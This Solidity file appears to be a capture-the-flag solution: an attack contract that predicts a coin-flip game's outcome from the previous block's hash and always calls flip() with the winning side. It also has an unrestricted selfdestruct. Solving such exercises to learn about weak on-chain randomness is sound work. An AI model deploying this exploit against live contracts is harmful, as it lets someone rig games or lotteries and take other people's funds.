// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import 'interfaces/coinflipInterface.sol';
contract CoinFlipAttack {
  CoinFlipInterface coinflipContract;

  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _address) public {
    coinflipContract = CoinFlipInterface(_address);
  }

  function hack() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    bool result = coinflipContract.flip(side);
    require(result);
  }

  // clean contract
  function destroy() public {
    selfdestruct(msg.sender);
  }
}
